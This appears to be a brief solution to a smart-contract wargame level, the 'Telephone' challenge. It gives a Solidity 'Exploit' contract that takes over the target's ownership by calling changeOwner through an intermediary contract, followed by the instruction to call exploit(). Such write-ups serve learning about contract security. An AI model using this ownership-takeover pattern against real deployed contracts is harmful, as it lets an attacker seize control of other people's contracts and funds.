Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
    function changeOwner(address) external;
}

contract Exploit {

    function exploit(address _who) public {
        Telephone(_who).changeOwner(msg.sender);
    }
}
```
call exploit()
